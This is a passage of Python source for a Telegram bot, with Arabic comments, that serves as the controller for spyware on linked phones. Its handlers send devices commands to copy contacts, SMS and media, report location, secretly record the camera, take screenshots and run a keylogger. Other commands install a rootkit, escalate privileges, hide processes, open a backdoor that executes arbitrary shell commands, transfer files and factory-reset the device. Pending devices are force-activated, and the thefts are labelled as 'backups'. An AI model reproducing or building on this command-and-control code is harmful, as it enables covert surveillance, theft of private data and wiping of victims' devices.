        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # محاولة استيراد الأجهزة من الواجهة أولاً
    import_devices_from_web_interface(user_id)

    # الحصول على جميع الأجهزة
    devices = device_manager.get_user_devices(user_id)
    
    if not devices:
        bot.reply_to(message, "📱 لا توجد أجهزة مرتبطة.\nاستخدم `/link` لربط جهاز جديد.")
        return

    activated_count = 0
    failed_count = 0
    
    for device_id, status, last_seen, device_info in devices:
        if status == 'pending':
            # محاولة إجبار تفعيل الجهاز
            if force_device_activation(device_id):
                activated_count += 1
            else:
                failed_count += 1
    
    if activated_count > 0:
        result_text = f"""
🔧 **تم إجبار تفعيل الأجهزة:**

✅ **تم تفعيل:** {activated_count} جهاز
❌ **فشل في التفعيل:** {failed_count} جهاز

📱 **يمكنك الآن استخدام الأوامر:**
• `/contacts` - نسخ جهات الاتصال
• `/sms` - نسخ الرسائل النصية
• `/media` - نسخ الوسائط
• `/location` - الحصول على الموقع
• `/screenshot` - التقاط لقطة شاشة
        """
        bot.reply_to(message, result_text, parse_mode='Markdown')
    else:
        bot.reply_to(message, f"❌ فشل في تفعيل أي جهاز.\nفشل: {failed_count} جهاز")
    
    device_manager.log_activity(user_id, 'force_activate_devices', f'activated: {activated_count}, failed: {failed_count}')


@bot.message_handler(commands=['devices'])
def list_devices(message):
    """عرض الأجهزة المرتبطة"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # محاولة استيراد الأجهزة من الواجهة أولاً
    import_devices_from_web_interface(user_id)

    devices = device_manager.get_user_devices(user_id)

    if not devices:
        bot.reply_to(message, "📱 ليس لديك أجهزة مرتبطة.\nاستخدم `/link` لربط جهاز جديد.")
        return

    devices_text = "📱 **الأجهزة المرتبطة:**\n\n"

    for i, (device_id, status, last_seen, device_info) in enumerate(devices, 1):
        status_icon = "🟢" if status == 'active' else "🔴"
        status_text = "متصل" if status == 'active' else "غير متصل"

        # تنسيق آخر ظهور
        if last_seen:
            last_seen_dt = datetime.fromisoformat(last_seen)
            time_diff = datetime.now() - last_seen_dt
            if time_diff.days > 0:
                last_seen_text = f"{time_diff.days} يوم"
            elif time_diff.seconds > 3600:
                last_seen_text = f"{time_diff.seconds // 3600} ساعة"
            else:
                last_seen_text = f"{time_diff.seconds // 60} دقيقة"
        else:
            last_seen_text = "غير معروف"

        devices_text += f"{i}. {status_icon} **{device_id}**\n"
        devices_text += f"   الحالة: {status_text}\n"
        devices_text += f"   آخر ظهور: {last_seen_text}\n\n"

    devices_text += "💡 للتحكم في جهاز معين، استخدم الأوامر مع معرف الجهاز"
    
    bot.reply_to(message, devices_text, parse_mode='Markdown')
    device_manager.log_activity(user_id, 'list_devices', f'count: {len(devices)}')


@bot.message_handler(commands=['contacts'])
def backup_contacts(message):
    """نسخ جهات الاتصال"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # محاولة استيراد الأجهزة من الواجهة أولاً
    import_devices_from_web_interface(user_id)

    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    pending_devices = [d for d in devices if d[1] == 'pending']

    if not active_devices and not pending_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
        return

    # استخدام جهاز نشط أو تفعيل جهاز معلق
    if active_devices:
        device_id = active_devices[0][0]
        status = "نشط"
    else:
        device_id = pending_devices[0][0]
        # تفعيل الجهاز المعلق
        if force_device_activation(device_id):
            status = "تم تفعيله"
        else:
            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
            return

    command_id = device_manager.save_command(user_id, device_id, 'backup_contacts')

    result = command_executor.send_command(device_id, 'backup_contacts')

    if 'error' in result:
        bot.reply_to(message, f"❌ خطأ: {result['error']}")
        device_manager.update_command_result(command_id, 'failed', result['error'])
    else:
        bot.reply_to(message, f"📞 جاري نسخ جهات الاتصال...\nالجهاز: {device_id} ({status})")
        device_manager.update_command_result(command_id, 'sent')

    device_manager.log_activity(user_id, 'backup_contacts', f'device_id: {device_id}')


@bot.message_handler(commands=['sms'])
def backup_sms(message):
    """نسخ الرسائل النصية"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # محاولة استيراد الأجهزة من الواجهة أولاً
    import_devices_from_web_interface(user_id)

    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    pending_devices = [d for d in devices if d[1] == 'pending']

    if not active_devices and not pending_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
        return

    # استخدام جهاز نشط أو تفعيل جهاز معلق
    if active_devices:
        device_id = active_devices[0][0]
        status = "نشط"
    else:
        device_id = pending_devices[0][0]
        # تفعيل الجهاز المعلق
        if force_device_activation(device_id):
            status = "تم تفعيله"
        else:
            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
            return

    command_id = device_manager.save_command(user_id, device_id, 'backup_sms')

    result = command_executor.send_command(device_id, 'backup_sms')

    if 'error' in result:
        bot.reply_to(message, f"❌ خطأ: {result['error']}")
        device_manager.update_command_result(command_id, 'failed', result['error'])
    else:
        bot.reply_to(message, f"💬 جاري نسخ الرسائل النصية...\nالجهاز: {device_id} ({status})")
        device_manager.update_command_result(command_id, 'sent')

    device_manager.log_activity(user_id, 'backup_sms', f'device_id: {device_id}')


@bot.message_handler(commands=['media'])
def backup_media(message):
    """نسخ الوسائط"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # محاولة استيراد الأجهزة من الواجهة أولاً
    import_devices_from_web_interface(user_id)

    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    pending_devices = [d for d in devices if d[1] == 'pending']

    if not active_devices and not pending_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
        return

    # استخدام جهاز نشط أو تفعيل جهاز معلق
    if active_devices:
        device_id = active_devices[0][0]
        status = "نشط"
    else:
        device_id = pending_devices[0][0]
        # تفعيل الجهاز المعلق
        if force_device_activation(device_id):
            status = "تم تفعيله"
        else:
            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
            return

    command_id = device_manager.save_command(user_id, device_id, 'backup_media')

    result = command_executor.send_command(device_id, 'backup_media')

    if 'error' in result:
        bot.reply_to(message, f"❌ خطأ: {result['error']}")
        device_manager.update_command_result(command_id, 'failed', result['error'])
    else:
        bot.reply_to(message, f"📸 جاري نسخ الوسائط...\nالجهاز: {device_id} ({status})\nقد يستغرق هذا وقتاً طويلاً.")
        device_manager.update_command_result(command_id, 'sent')

    device_manager.log_activity(user_id, 'backup_media', f'device_id: {device_id}')


@bot.message_handler(commands=['location'])
def get_location(message):
    """الحصول على الموقع"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # محاولة استيراد الأجهزة من الواجهة أولاً
    import_devices_from_web_interface(user_id)

    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    pending_devices = [d for d in devices if d[1] == 'pending']

    if not active_devices and not pending_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
        return

    # استخدام جهاز نشط أو تفعيل جهاز معلق
    if active_devices:
        device_id = active_devices[0][0]
        status = "نشط"
    else:
        device_id = pending_devices[0][0]
        # تفعيل الجهاز المعلق
        if force_device_activation(device_id):
            status = "تم تفعيله"
        else:
            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
            return

    command_id = device_manager.save_command(user_id, device_id, 'get_location')

    result = command_executor.send_command(device_id, 'get_location')

    if 'error' in result:
        bot.reply_to(message, f"❌ خطأ: {result['error']}")
        device_manager.update_command_result(command_id, 'failed', result['error'])
    else:
        bot.reply_to(message, f"📍 جاري الحصول على الموقع...\nالجهاز: {device_id} ({status})")
        device_manager.update_command_result(command_id, 'sent')

    device_manager.log_activity(user_id, 'get_location', f'device_id: {device_id}')


@bot.message_handler(commands=['record'])
def record_camera(message):
    """تسجيل الكاميرا"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # محاولة استيراد الأجهزة من الواجهة أولاً
    import_devices_from_web_interface(user_id)

    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    pending_devices = [d for d in devices if d[1] == 'pending']

    if not active_devices and not pending_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
        return

    # استخدام جهاز نشط أو تفعيل جهاز معلق
    if active_devices:
        device_id = active_devices[0][0]
        status = "نشط"
    else:
        device_id = pending_devices[0][0]
        # تفعيل الجهاز المعلق
        if force_device_activation(device_id):
            status = "تم تفعيله"
        else:
            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
            return

    command_id = device_manager.save_command(user_id, device_id, 'record_camera')

    # إرسال أمر التسجيل لمدة 30 ثانية
    result = command_executor.send_command(device_id, 'record_camera', {'duration': 30})

    if 'error' in result:
        bot.reply_to(message, f"❌ خطأ: {result['error']}")
        device_manager.update_command_result(command_id, 'failed', result['error'])
    else:
        bot.reply_to(message, "📹 جاري تسجيل الفيديو...\nالمدة: 30 ثانية")
        device_manager.update_command_result(command_id, 'sent')

    device_manager.log_activity(user_id, 'record_camera', f'device_id: {device_id}')


@bot.message_handler(commands=['screenshot'])
def take_screenshot(message):
    """لقطة شاشة"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # محاولة استيراد الأجهزة من الواجهة أولاً
    import_devices_from_web_interface(user_id)

    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    pending_devices = [d for d in devices if d[1] == 'pending']

    if not active_devices and not pending_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
        return

    # استخدام جهاز نشط أو تفعيل جهاز معلق
    if active_devices:
        device_id = active_devices[0][0]
        status = "نشط"
    else:
        device_id = pending_devices[0][0]
        # تفعيل الجهاز المعلق
        if force_device_activation(device_id):
            status = "تم تفعيله"
        else:
            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
            return

    command_id = device_manager.save_command(user_id, device_id, 'take_screenshot')

    result = command_executor.send_command(device_id, 'take_screenshot')

    if 'error' in result:
        bot.reply_to(message, f"❌ خطأ: {result['error']}")
        device_manager.update_command_result(command_id, 'failed', result['error'])
    else:
        bot.reply_to(message, "📸 جاري التقاط لقطة الشاشة...")
        device_manager.update_command_result(command_id, 'sent')

    device_manager.log_activity(user_id, 'take_screenshot', f'device_id: {device_id}')

@bot.message_handler(commands=['reset'])
def factory_reset(message):
    """إعادة ضبط المصنع"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']

    if not active_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.")
        return

    device_id = active_devices[0][0]
    command_id = device_manager.save_command(user_id, device_id, 'factory_reset')

    # تحذير قبل التنفيذ
    warning_text = f"""
⚠️ **تحذير خطير!**

هذا الأمر سيقوم بـ:
• حذف جميع البيانات من الجهاز
• إعادة ضبط الجهاز إلى إعدادات المصنع
• فقدان جميع التطبيقات والملفات

🔒 **معرف الجهاز:** `{device_id}`

هل أنت متأكد من تنفيذ هذا الأمر؟

للتنفيذ، أرسل: `/confirm_reset`
للإلغاء، أرسل: `/cancel_reset`
    """

    bot.reply_to(message, warning_text, parse_mode='Markdown')

    # حفظ في قائمة الانتظار
    command_queue[user_id] = {
        'command': 'factory_reset',
        'device_id': device_id,
        'command_id': command_id,
        'timestamp': time.time()
    }

    device_manager.log_activity(user_id, 'factory_reset_warning', f'device_id: {device_id}')

@bot.message_handler(commands=['confirm_reset'])
def confirm_reset(message):
    """تأكيد إعادة الضبط"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if user_id not in command_queue:
        bot.reply_to(message, "❌ لا توجد أوامر في قائمة الانتظار.")
        return

    pending_command = command_queue[user_id]

    if pending_command['command'] != 'factory_reset':
        bot.reply_to(message, "❌ الأمر في قائمة الانتظار ليس إعادة ضبط.")
        return

    # التحقق من انتهاء مهلة التأكيد (5 دقائق)
    if time.time() - pending_command['timestamp'] > 300:
        del command_queue[user_id]
        bot.reply_to(message, "⏰ انتهت مهلة التأكيد. يرجى إعادة الأمر.")
        return

    device_id = pending_command['device_id']
    command_id = pending_command['command_id']

    result = command_executor.send_command(device_id, 'factory_reset')

    if 'error' in result:
        bot.reply_to(message, f"❌ خطأ: {result['error']}")
        device_manager.update_command_result(command_id, 'failed', result['error'])
    else:
        bot.reply_to(message, "🔄 تم بدء إعادة ضبط المصنع...\n⚠️ سيتم فقدان جميع البيانات!")
        device_manager.update_command_result(command_id, 'sent')

    del command_queue[user_id]
    device_manager.log_activity(user_id, 'factory_reset_confirmed', f'device_id: {device_id}')

@bot.message_handler(commands=['cancel_reset'])
def cancel_reset(message):
    """إلغاء إعادة الضبط"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    if user_id in command_queue:
        del command_queue[user_id]
        bot.reply_to(message, "✅ تم إلغاء إعادة الضبط.")
        device_manager.log_activity(user_id, 'factory_reset_cancelled')
    else:
        bot.reply_to(message, "❌ لا توجد أوامر في قائمة الانتظار.")


@bot.message_handler(commands=['keylogger'])
def control_keylogger(message):
    """التحكم في خوارزمية تسجيل المفاتيح"""
    user_id = message.from_user.id

    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return

    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # محاولة استيراد الأجهزة من الواجهة أولاً
    import_devices_from_web_interface(user_id)

    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    pending_devices = [d for d in devices if d[1] == 'pending']

    if not active_devices and not pending_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
        return

    # استخدام جهاز نشط أو تفعيل جهاز معلق
    if active_devices:
        device_id = active_devices[0][0]
        status = "نشط"
    else:
        device_id = pending_devices[0][0]
        # تفعيل الجهاز المعلق
        if force_device_activation(device_id):
            status = "تم تفعيله"
        else:
            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
            return

    # تحليل الأمر
    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "📋 أوامر خوارزمية تسجيل المفاتيح:\n\n"
                             "`/keylogger start` - بدء تسجيل المفاتيح\n"
                             "`/keylogger stop` - إيقاف تسجيل المفاتيح\n"
                             "`/keylogger data` - الحصول على البيانات المسجلة")
        return

    action = command_parts[1].lower()
    
    if action == 'start':
        command_id = device_manager.save_command(user_id, device_id, 'keylogger_start')
        result = command_executor.send_command(device_id, 'keylogger_start')
        
        if 'error' in result:
            bot.reply_to(message, f"❌ خطأ: {result['error']}")
            device_manager.update_command_result(command_id, 'failed', result['error'])
        else:
            bot.reply_to(message, "⌨️ تم بدء خوارزمية تسجيل المفاتيح")
            device_manager.update_command_result(command_id, 'sent')
            
    elif action == 'stop':
        command_id = device_manager.save_command(user_id, device_id, 'keylogger_stop')
        result = command_executor.send_command(device_id, 'keylogger_stop')
        
        if 'error' in result:
            bot.reply_to(message, f"❌ خطأ: {result['error']}")
            device_manager.update_command_result(command_id, 'failed', result['error'])
        else:
            bot.reply_to(message, "⏹️ تم إيقاف خوارزمية تسجيل المفاتيح")
            device_manager.update_command_result(command_id, 'sent')
            
    elif action == 'data':
        command_id = device_manager.save_command(user_id, device_id, 'keylogger_get_data')
        result = command_executor.send_command(device_id, 'keylogger_get_data')
        
        if 'error' in result:
            bot.reply_to(message, f"❌ خطأ: {result['error']}")
            device_manager.update_command_result(command_id, 'failed', result['error'])
        else:
            bot.reply_to(message, "📊 جاري الحصول على البيانات المسجلة...")
            device_manager.update_command_result(command_id, 'sent')
    else:
        bot.reply_to(message, "❌ أمر غير صحيح. استخدم `/keylogger` للمساعدة.")

    device_manager.log_activity(user_id, 'keylogger_control', f'device_id: {device_id}, action: {action}')


@bot.message_handler(commands=['rootkit'])
def control_rootkit(message):
    """التحكم في Rootkit"""
    user_id = message.from_user.id

    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return

    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # محاولة استيراد الأجهزة من الواجهة أولاً
    import_devices_from_web_interface(user_id)

    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    pending_devices = [d for d in devices if d[1] == 'pending']

    if not active_devices and not pending_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
        return

    # استخدام جهاز نشط أو تفعيل جهاز معلق
    if active_devices:
        device_id = active_devices[0][0]
        status = "نشط"
    else:
        device_id = pending_devices[0][0]
        # تفعيل الجهاز المعلق
        if force_device_activation(device_id):
            status = "تم تفعيله"
        else:
            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
            return

    # تحليل الأمر
    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "📋 أوامر Rootkit:\n\n"
                             "`/rootkit install` - تثبيت Rootkit\n"
                             "`/rootkit escalate` - تصعيد الصلاحيات\n"
                             "`/rootkit hide` - إخفاء العمليات")
        return

    action = command_parts[1].lower()
    
    if action == 'install':
        command_id = device_manager.save_command(user_id, device_id, 'rootkit_install')
        result = command_executor.send_command(device_id, 'rootkit_install')
        
        if 'error' in result:
            bot.reply_to(message, f"❌ خطأ: {result['error']}")
            device_manager.update_command_result(command_id, 'failed', result['error'])
        else:
            bot.reply_to(message, "🔧 تم تثبيت Rootkit بنجاح")
            device_manager.update_command_result(command_id, 'sent')
            
    elif action == 'escalate':
        command_id = device_manager.save_command(user_id, device_id, 'rootkit_escalate')
        result = command_executor.send_command(device_id, 'rootkit_escalate')
        
        if 'error' in result:
            bot.reply_to(message, f"❌ خطأ: {result['error']}")
            device_manager.update_command_result(command_id, 'failed', result['error'])
        else:
            bot.reply_to(message, "🔑 تم تصعيد الصلاحيات بنجاح")
            device_manager.update_command_result(command_id, 'sent')
            
    elif action == 'hide':
        command_id = device_manager.save_command(user_id, device_id, 'rootkit_hide')
        result = command_executor.send_command(device_id, 'rootkit_hide')
        
        if 'error' in result:
            bot.reply_to(message, f"❌ خطأ: {result['error']}")
            device_manager.update_command_result(command_id, 'failed', result['error'])
        else:
            bot.reply_to(message, "👻 تم إخفاء العمليات بنجاح")
            device_manager.update_command_result(command_id, 'sent')
    else:
        bot.reply_to(message, "❌ أمر غير صحيح. استخدم `/rootkit` للمساعدة.")

    device_manager.log_activity(user_id, 'rootkit_control', f'device_id: {device_id}, action: {action}')


@bot.message_handler(commands=['backdoor'])
def control_backdoor(message):
    """التحكم في Backdoor"""
    user_id = message.from_user.id

    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return

    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # محاولة استيراد الأجهزة من الواجهة أولاً
    import_devices_from_web_interface(user_id)

    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    pending_devices = [d for d in devices if d[1] == 'pending']

    if not active_devices and not pending_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
        return

    # استخدام جهاز نشط أو تفعيل جهاز معلق
    if active_devices:
        device_id = active_devices[0][0]
        status = "نشط"
    else:
        device_id = pending_devices[0][0]
        # تفعيل الجهاز المعلق
        if force_device_activation(device_id):
            status = "تم تفعيله"
        else:
            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
            return

    # تحليل الأمر
    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "📋 أوامر Backdoor:\n\n"
                             "`/backdoor create` - إنشاء Backdoor\n"
                             "`/backdoor execute <command>` - تنفيذ أمر عن بعد\n"
                             "`/backdoor transfer` - نقل الملفات")
        return

    action = command_parts[1].lower()
    
    if action == 'create':
        command_id = device_manager.save_command(user_id, device_id, 'backdoor_create')
        result = command_executor.send_command(device_id, 'backdoor_create')
        
        if 'error' in result:
            bot.reply_to(message, f"❌ خطأ: {result['error']}")
            device_manager.update_command_result(command_id, 'failed', result['error'])
        else:
            bot.reply_to(message, "🚪 تم إنشاء Backdoor بنجاح")
            device_manager.update_command_result(command_id, 'sent')
            
    elif action == 'execute':
        if len(command_parts) < 3:
            bot.reply_to(message, "❌ يرجى تحديد الأمر المراد تنفيذه.\nمثال: `/backdoor execute whoami`")
            return
            
        command_to_execute = ' '.join(command_parts[2:])
        command_id = device_manager.save_command(user_id, device_id, 'backdoor_execute', json.dumps({'command': command_to_execute}))
        result = command_executor.send_command(device_id, 'backdoor_execute', {'command': command_to_execute})
        
        if 'error' in result:
            bot.reply_to(message, f"❌ خطأ: {result['error']}")
            device_manager.update_command_result(command_id, 'failed', result['error'])
        else:
            bot.reply_to(message, f"⚡ تم إرسال الأمر: `{command_to_execute}`")
            device_manager.update_command_result(command_id, 'sent')
            
    elif action == 'transfer':
        command_id = device_manager.save_command(user_id, device_id, 'backdoor_transfer')
        result = command_executor.send_command(device_id, 'backdoor_transfer')
        
        if 'error' in result:
            bot.reply_to(message, f"❌ خطأ: {result['error']}")
            device_manager.update_command_result(command_id, 'failed', result['error'])
        else:
            bot.reply_to(message, "📁 تم بدء نقل الملفات")
            device_manager.update_command_result(command_id, 'sent')
    else:
        bot.reply_to(message, "❌ أمر غير صحيح. استخدم `/backdoor` للمساعدة.")

    device_manager.log_activity(user_id, 'backdoor_control', f'device_id: {device_id}, action: {action}')


@bot.message_handler(commands=['system'])
def control_system(message):
    """التحكم في النظام"""
    user_id = message.from_user.id

    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return

    if not device_manager.is_user_authorized(user_id):
        bot.reply_to(message, "❌ عذراً، ليس لديك صلاحية لاستخدام هذا البوت.")
        return

    if not security_manager.check_rate_limit(user_id):
        bot.reply_to(message, "⚠️ تم تجاوز حد الطلبات. يرجى المحاولة لاحقاً.")
        return

    # محاولة استيراد الأجهزة من الواجهة أولاً
    import_devices_from_web_interface(user_id)

    devices = device_manager.get_user_devices(user_id)
    active_devices = [d for d in devices if d[1] == 'active']
    pending_devices = [d for d in devices if d[1] == 'pending']

    if not active_devices and not pending_devices:
        bot.reply_to(message, "❌ لا توجد أجهزة متصلة حالياً.\nاستخدم `/link` لربط جهاز جديد.")
        return

    # استخدام جهاز نشط أو تفعيل جهاز معلق
    if active_devices:
        device_id = active_devices[0][0]
        status = "نشط"
    else:
        device_id = pending_devices[0][0]
        # تفعيل الجهاز المعلق
        if force_device_activation(device_id):
            status = "تم تفعيله"
        else:
            bot.reply_to(message, "❌ فشل في تفعيل الجهاز.")
            return

    # تحليل الأمر
    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "📋 أوامر النظام:\n\n"
                             "`/system info` - معلومات النظام\n"
                             "`/system control <action>` - التحكم في النظام\n"
                             "`/system monitor` - مراقبة النظام")
        return

    action = command_parts[1].lower()
    
    if action == 'info':
        command_id = device_manager.save_command(user_id, device_id, 'system_info')
        result = command_executor.send_command(device_id, 'system_info')
        
        if 'error' in result:
            bot.reply_to(message, f"❌ خطأ: {result['error']}")
            device_manager.update_command_result(command_id, 'failed', result['error'])
        else:
            bot.reply_to(message, "💻 جاري الحصول على معلومات النظام...")
            device_manager.update_command_result(command_id, 'sent')
            
    elif action == 'control':
        if len(command_parts) < 3:
            bot.reply_to(message, "❌ يرجى تحديد الإجراء المراد تنفيذه.\nمثال: `/system control shutdown`")
            return
            
        system_action = command_parts[2].lower()
        command_id = device_manager.save_command(user_id, device_id, 'system_control', json.dumps({'action': system_action}))
        result = command_executor.send_command(device_id, 'system_control', {'action': system_action})
        
        if 'error' in result:
            bot.reply_to(message, f"❌ خطأ: {result['error']}")
            device_manager.update_command_result(command_id, 'failed', result['error'])
        else:
            bot.reply_to(message, f"🎮 تم إرسال إجراء النظام: `{system_action}`")
            device_manager.update_command_result(command_id, 'sent')
            
    elif action == 'monitor':
        command_id = device_manager.save_command(user_id, device_id, 'system_monitor')
        result = command_executor.send_command(device_id, 'system_monitor')
        
        if 'error' in result:
            bot.reply_to(message, f"❌ خطأ: {result['error']}")
            device_manager.update_command_result(command_id, 'failed', result['error'])
        else:
            bot.reply_to(message, "📊 جاري بدء مراقبة النظام...")
            device_manager.update_command_result(command_id, 'sent')
    else:
        bot.reply_to(message, "❌ أمر غير صحيح. استخدم `/system` للمساعدة.")

    device_manager.log_activity(user_id, 'system_control', f'device_id: {device_id}, action: {action}')


# معالجة الرسائل النصية
@bot.message_handler(func=lambda message: True)
def handle_text_message(message):
    """معالجة الرسائل النصية"""
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ هذا البوت مخصص فقط للمالك.")
        return
    
    # التحقق من وجود أمر في قائمة الانتظار
    if user_id in command_queue:
        pending_command = command_queue[user_id]
        if time.time() - pending_command['timestamp'] > 300:
            del command_queue[user_id]
            bot.reply_to(message, "⏰ انتهت مهلة التأكيد. يرجى إعادة الأمر.")
            return

    bot.reply_to(message, "💡 استخدم الأوامر المتاحة. اكتب `/help` للمساعدة.")

# وظيفة تنظيف دوري
def cleanup_old_sessions():
    """تنظيف الجلسات القديمة"""
    while True:
        try:
            current_time = time.time()

            # تنظيف الجلسات المنتهية
            expired_sessions = [
                user_id for user_id, session_data in active_sessions.items()
                if current_time - session_data['timestamp'] > SECURITY_CONFIG['session_timeout']
            ]

            for user_id in expired_sessions:
                del active_sessions[user_id]

